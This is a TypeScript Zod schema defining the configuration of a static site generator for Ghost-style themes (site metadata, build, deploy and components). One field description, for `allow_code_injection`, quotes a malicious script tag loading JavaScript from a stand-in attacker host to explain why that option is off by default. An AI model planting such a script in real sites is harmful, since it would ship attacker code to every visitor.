import { z } from 'zod';

const navigationItemSchema = z
  .object({
    label: z.string().describe('Anchor text shown in theme navigation.'),
    url: z
      .string()
      .describe(
        'Destination of the link. May be an absolute URL or a path relative to the site root.',
      ),
  })
  .strict();

export const configSchema = z
  .object({
    site: z
      .object({
        title: z.string().describe('Display title of the site, used by themes and feeds.'),
        description: z
          .string()
          .default('')
          .describe(
            'Short tagline rendered alongside the title in many themes and in feed metadata.',
          ),
        url: z
          .string()
          .default('http://localhost:4321')
          .describe(
            'Public absolute URL of the deployed site. Used to build canonical links, sitemap entries, and RSS GUIDs.',
          ),
        locale: z
          .string()
          .default('en')
          .describe(
            "BCP 47 language tag for the site. Drives `{{lang}}` and selects the theme's `locales/<tag>.json` translation file.",
          ),
        timezone: z
          .string()
          .default('UTC')
          .describe('IANA timezone used when formatting dates in templates via `{{date}}`.'),
        cover_image: z
          .string()
          .optional()
          .describe('Optional URL or content-relative path to a site-wide cover image.'),
        logo: z
          .string()
          .optional()
          .describe('Optional URL or content-relative path to the site logo.'),
        logo_width: z
          .number()
          .int()
          .positive()
          .optional()
          .describe('Intrinsic width of the logo in pixels. Used by themes to avoid layout shift.'),
        logo_height: z
          .number()
          .int()
          .positive()
          .optional()
          .describe(
            'Intrinsic height of the logo in pixels. Used by themes to avoid layout shift.',
          ),
        icon: z
          .string()
          .optional()
          .describe('Optional URL or content-relative path to the favicon / app icon.'),
        accent_color: z
          .string()
          .default('#222222')
          .describe(
            'Brand accent color as a CSS color string. Surfaced to themes as `@site.accent_color`.',
          ),
        twitter: z
          .string()
          .optional()
          .describe(
            'Optional Twitter / X handle (e.g. `@nectar`). Used to populate `twitter:site` meta tags.',
          ),
        facebook: z
          .string()
          .optional()
          .describe(
            'Optional Facebook page slug. Used to populate `og:article:publisher` meta tags.',
          ),
      })
      .strict()
      .default({ title: 'Nectar Site' })
      .describe('Site-wide metadata exposed to themes as `@site` and `@blog`.'),
    theme: z
      .object({
        name: z
          .string()
          .default('source')
          .describe('Theme directory name inside `theme.dir`. Resolved as `<dir>/<name>/`.'),
        dir: z
          .string()
          .default('themes')
          .describe('Directory containing theme folders, relative to the project root.'),
        custom: z
          .record(z.unknown())
          .default({})
          .describe(
            "Free-form key/value map surfaced to templates as `@custom`. Mirrors Ghost's `package.json` `config.custom` settings.",
          ),
      })
      .strict()
      .default({})
      .describe('Theme selection and `@custom` settings.'),
    content: z
      .object({
        posts_dir: z
          .string()
          .default('content/posts')
          .describe('Directory of Markdown post sources, relative to the project root.'),
        pages_dir: z
          .string()
          .default('content/pages')
          .describe('Directory of Markdown page sources, relative to the project root.'),
        authors_dir: z
          .string()
          .default('content/authors')
          .describe('Directory of author profile Markdown files, relative to the project root.'),
        tags_dir: z
          .string()
          .default('content/tags')
          .describe('Directory of tag profile Markdown files, relative to the project root.'),
        assets_dir: z
          .string()
          .default('content/images')
          .describe(
            'Directory of content-bundled image and binary assets, relative to the project root.',
          ),
        visibility_policy: z
          .enum(['truncate', 'render-full', 'skip'])
          .default('truncate')
          .describe(
            'How to render posts whose `visibility` is `members` or `paid`. `truncate` cuts the body at `paywall_word_count`, `render-full` keeps the body intact (losing the paywall), and `skip` drops the post entirely.',
          ),
        paywall_word_count: z
          .number()
          .int()
          .positive()
          .default(300)
          .describe(
            'Number of words kept before the paywall cut when `visibility_policy` is `truncate`.',
          ),
      })
      .strict()
      .default({})
      .describe('Where Markdown content lives and how members-only posts are handled.'),
    build: z
      .object({
        output_dir: z
          .string()
          .default('dist')
          .describe('Directory to emit the built site into, relative to the project root.'),
        base_path: z
          .string()
          .default('/')
          .describe(
            'URL prefix the site is served from (e.g. `/` for a root deployment, `/blog/` for a subpath). All generated links and asset URLs respect this prefix.',
          ),
        posts_per_page: z
          .number()
          .int()
          .positive()
          .default(12)
          .describe('Posts per paginated index / archive page.'),
        copy_content_assets: z
          .boolean()
          .default(true)
          .describe(
            'When true, copy `content.assets_dir` into the output as `content/images/` so post-relative image URLs resolve.',
          ),
        max_image_bytes: z
          .number()
          .int()
          .nonnegative()
          .default(5 * 1024 * 1024)
          .describe(
            'Refuse to emit raster images larger than this many bytes during content-asset copy, so a stray 40 MB DSLR JPEG cannot tank LCP. `0` disables the check entirely. Default is 5 MiB.',
          ),
        allow_code_injection: z
          .boolean()
          .default(false)
          .describe(
            "Allow per-post `codeinjection_head` / `codeinjection_foot` frontmatter to inject raw HTML via `{{ghost_head}}` / `{{ghost_foot}}`. Disabled by default because a single PR adding `codeinjection_foot: '<script src=//evil.tld/x.js></script>'` would ship site-wide JS once merged. Set to `true` only if you trust every contributor with write access to `content/` to add arbitrary HTML or JS.",
          ),
      })
      .strict()
      .default({})
      .describe('Build pipeline options that shape the emitted site.'),
    navigation: z
      .array(navigationItemSchema)
      .default([])
      .describe('Primary navigation items, exposed to themes via `{{navigation}}`.'),
    secondary_navigation: z
      .array(navigationItemSchema)
      .default([])
      .describe(
        'Secondary navigation items, exposed to themes via `{{navigation type="secondary"}}`.',
      ),
    deploy: z
      .object({
        github_pages: z
          .object({
            custom_domain: z
              .string()
              .optional()
              .describe(
                'Apex or subdomain host to bind to a GitHub Pages site (e.g. `blog.example.com`). When set, the build emits a `CNAME` file at the output root so GitHub Pages picks up the custom domain. Leave unset for `*.github.io` deployments.',
              ),
          })
          .strict()
          .default({})
          .describe('GitHub Pages-specific deploy hints.'),
        cloudflare_pages: z
          .object({
            enabled: z
              .boolean()
              .default(false)
              .describe(
                'Emit a Cloudflare Pages `_headers` file at the output root. Defaults pin fingerprinted asset URLs (`/assets/*`, `/content/images/*`) to a year of immutable caching and force HTML responses to revalidate every request, plus a minimal set of security headers (`X-Content-Type-Options`, `Referrer-Policy`). Leave disabled when deploying somewhere other than Cloudflare Pages.',
              ),
          })
          .strict()
          .default({})
          .describe('Cloudflare Pages-specific deploy hints.'),
      })
      .strict()
      .default({})
      .describe('Deploy-target-specific hints that influence files emitted alongside the site.'),
    components: z
      .object({
        rss: z
          .object({
            enabled: z.boolean().default(true).describe('Emit an `rss.xml` feed.'),
            items: z.number().default(20).describe('Maximum number of posts included in the feed.'),
          })
          .strict()
          .default({})
          .describe('RSS feed component.'),
        sitemap: z
          .object({
            enabled: z.boolean().default(true).describe('Emit `sitemap.xml`.'),
          })
          .strict()
          .default({})
          .describe('Sitemap component.'),
        opengraph: z
          .object({
            enabled: z
              .boolean()
              .default(true)
              .describe('Emit Open Graph and Twitter Card meta tags via `{{ghost_head}}`.'),
            rasterize_svg: z
              .boolean()
              .default(true)
              .describe(
                'Convert SVG cover images to PNG for OG sharing so Facebook and X render them.',
              ),
            rasterize_width: z
              .number()
              .int()
              .positive()
              .default(1200)
              .describe('Pixel width used when rasterizing SVG cover images for OG.'),
          })
          .strict()
          .default({})
          .describe('Open Graph and Twitter Card metadata component.'),
        og_images: z
          .object({
            enabled: z
              .boolean()
              .default(false)
              .describe('Render per-post Open Graph images from a template.'),
            template: z
              .string()
              .optional()
              .describe('Path to the OG image template, relative to the project root.'),
            width: z
              .number()
              .int()
              .positive()
              .default(1200)
              .describe('Generated OG image width in pixels.'),
            height: z
              .number()
              .int()
              .positive()
              .default(630)
              .describe('Generated OG image height in pixels.'),
          })
          .strict()
          .default({})
          .describe('Auto-generated Open Graph image component.'),
        content_api: z
          .object({
            enabled: z
              .boolean()
              .default(true)
              .describe(
                'Emit JSON snapshots of posts, pages, tags, and authors under `content-api/` so themes (and external consumers) can fetch a Ghost-style content view.',
              ),
          })
          .strict()
          .default({})
          .describe('JSON content API component.'),
        robots: z
          .object({
            enabled: z.boolean().default(true).describe('Emit a `robots.txt` file.'),
            disallow: z
              .boolean()
              .default(false)
              .describe(
                'When true, emit a `Disallow: /` robots.txt to block all crawling. Useful for staging.',
              ),
          })
          .strict()
          .default({})
          .describe('robots.txt component.'),
        subscribe: z
          .object({
            provider: z
              .enum(['none', 'buttondown', 'mailchimp', 'custom'])
              .default('none')
              .describe('Subscribe form provider. `none` hides the form entirely.'),
            action: z
              .string()
              .optional()
              .describe(
                'Form action URL. Required when `provider` is `custom`; inferred for known providers when omitted.',
              ),
            username: z
              .string()
              .optional()
              .describe(
                'Provider username (e.g. Buttondown username, Mailchimp list u/id segment).',
              ),
            email_field_name: z
              .string()
              .optional()
              .describe('Name of the email input field. Defaults to a provider-appropriate value.'),
          })
          .strict()
          .default({})
          .describe('Newsletter subscribe form component.'),
        images: z
          .object({
            enabled: z
              .boolean()
              .default(true)
              .describe(
                'Emit per-format image variants (WebP/AVIF) for jpg/png sources alongside the same-format responsive widths and wrap `<img>` in `<picture>` for browser fallback. Requires `sharp`; when sharp is not installed the `<picture>` wrap is skipped so themes keep working with the original `<img>`.',
              ),
            formats: z
              .array(z.enum(['webp', 'avif']))
              .default(['webp'])
              .describe(
                'Image formats to transcode the responsive variants into. Order matters: the first entry is preferred by browsers that understand it.',
              ),
            webp_quality: z
              .number()
              .int()
              .min(1)
              .max(100)
              .default(80)
              .describe('Quality factor passed to sharp when encoding WebP variants.'),
            avif_quality: z
              .number()
              .int()
              .min(1)
              .max(100)
              .default(50)
              .describe(
                'Quality factor passed to sharp when encoding AVIF variants. AVIF is much slower than WebP, so default is conservative.',
              ),
            cache_dir: z
              .string()
              .default('.nectar-cache/images')
              .describe(
                'Directory (relative to the project root) where transcoded variants are cached by content hash so unchanged sources skip re-encoding on the next build.',
              ),
          })
          .strict()
          .default({})
          .describe(
            'Per-format image transcoder. Generates WebP/AVIF variants of responsive widths and rewrites `<img>` into `<picture>` so themes get modern-format fallback automatically.',
          ),
        comments: z
          .object({
            provider: z
              .enum(['off', 'giscus', 'disqus', 'utterances', 'webmention.io'])
              .default('off')
              .describe(
                'Comments provider. `off` disables comments and renders `{{comments}}` as empty.',
              ),
            repo: z
              .string()
              .optional()
              .describe(
                'Giscus / Utterances: `owner/name` GitHub repository hosting the discussion.',
              ),
            repo_id: z
              .string()
              .optional()
              .describe('Giscus: opaque repository ID from giscus.app.'),
            category: z.string().optional().describe('Giscus: discussion category name.'),
            category_id: z
              .string()
              .optional()
              .describe('Giscus: opaque discussion category ID from giscus.app.'),
            mapping: z
              .string()
              .optional()
              .describe(
                'Giscus: page-to-discussion mapping strategy (`pathname`, `url`, `title`, etc.).',
              ),
            strict: z
              .boolean()
              .optional()
              .describe('Giscus: use strict mapping (exact match only).'),
            reactions_enabled: z
              .boolean()
              .optional()
              .describe('Giscus: enable reactions on discussions.'),
            emit_metadata: z
              .boolean()
              .optional()
              .describe('Giscus: emit discussion metadata to the parent page.'),
            input_position: z
              .enum(['top', 'bottom'])
              .optional()
              .describe('Giscus: place the comment composer above or below the thread.'),
            theme: z
              .string()
              .optional()
              .describe('Giscus: theme name or URL applied to the embedded widget.'),
            lang: z
              .string()
              .optional()
              .describe('Giscus / Disqus: BCP 47 language tag for the comments UI.'),
            loading: z
              .enum(['lazy', 'eager'])
              .optional()
              .describe('Giscus: iframe loading strategy.'),
            issue_term: z
              .string()
              .optional()
              .describe(
                'Utterances: how to map pages to issues (e.g. `pathname`, `url`, `title`).',
              ),
            label: z
              .string()
              .optional()
              .describe('Utterances: GitHub issue label applied to comment threads.'),
            shortname: z.string().optional().describe('Disqus: site shortname.'),
            identifier: z
              .string()
              .optional()
              .describe('Disqus: per-page identifier override. Defaults to the post slug.'),
            username: z
              .string()
              .optional()
              .describe('webmention.io: account username receiving webmentions.'),
          })
          .strict()
          .default({})
          .describe('Comments component. Field set used depends on `provider`.'),
      })
      .strict()
      .default({})
      .describe('Optional components that emit extra files or inject markup.'),
  })
  .strict();

export type NectarConfig = z.infer<typeof configSchema>;
export type NavigationItem = z.infer<typeof navigationItemSchema>;
